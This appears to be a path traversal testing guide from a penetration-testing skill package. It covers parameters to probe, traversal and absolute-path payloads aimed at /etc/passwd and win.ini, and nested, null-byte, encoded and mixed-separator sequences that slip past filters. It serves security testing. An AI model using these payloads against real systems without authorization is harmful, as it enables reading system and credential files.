# Detection & Encoding Bypass

## Parameters to test

```
filename  file  filepath  path  document  resource  template
page  lang  include  dir  folder  src  url
```
Check JSON bodies and headers too, not just query strings — some frameworks build a filesystem path from a header (`X-Forwarded-Host`, a locale/theme cookie) rather than an obvious file parameter.

## Basic traversal

```
../../../etc/passwd
....\\....\\....\\windows\\win.ini
```

## Absolute path bypass

If the application naively prepends a base directory (`base + userInput`) without checking that the *result* still starts with that base directory, supplying an absolute path overrides the prefix entirely on most platforms:
```
/etc/passwd
C:\Windows\win.ini
```

## Nested traversal (bypasses non-recursive stripping filters)

If a filter removes `../` but only does a single pass rather than looping until no more matches exist, placing one traversal sequence inside another survives the strip and reassembles into a working sequence once removed:
```
....//
..../
....\/
```

## Null byte and extension-validation bypass

Older runtimes (pre-PHP 5.3.4, and some legacy C-backed string handling elsewhere) truncate a string at a null byte, letting you defeat an extension allowlist that checks the end of the filename string while the underlying file-open call only sees everything before the null byte:
```
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg
```
This is rare on current platforms — confirm the runtime/language version actually exhibits null-byte truncation before relying on it; most modern stacks are unaffected.

## Encoding bypass (when raw `../` is blocked)

Work through these in order — filters frequently block the literal characters but decode/normalize at a different stage than they validate:

```
URL encoding:
  %2e%2e%2f   (../)
  %2e%2e%5c   (..\)

Double URL encoding (when a WAF decodes once before inspection, then
the application decodes again):
  %252e%252e%252f
  %252e%252e%255c

16-bit Unicode encoding:
  %u002e%u002e%u2215   (..%2f equivalent)
  %u002e%u002e%u2216   (..%5c equivalent)

Overlong UTF-8 encoding (multi-byte sequences encoding a character
that has a valid single-byte form — invalid per spec, but some
decoders accept it anyway):
  %c0%ae%c0%ae%c0%af   (overlong ../)
  %e0%80%ae            (overlong .)
```

## Mixed/duplicated separators (bypasses filters that only check one separator style)

```
..\/        (mixed forward/backslash)
..\\..\\    (escaped-looking backslash sequences some parsers normalize anyway)
```

## Filter-recursion test

To check whether a strip-based filter loops until stable or only runs once, submit a sequence that only becomes a valid traversal *after* one round of stripping has occurred — if it works, the filter isn't recursive and every single-pass strip filter in the application is suspect, not just this one parameter.

## What this phase confirms vs. what it doesn't

An encoding/nesting trick getting *accepted* (no error, no rejection) is not the finding — you need the actual resulting file content. If a bypass is accepted but the read still fails, the path likely resolved somewhere that doesn't exist; reconsider the relative depth (`../` count) or absolute path before concluding the bypass itself failed. See the validation gate in `SKILL.md`.
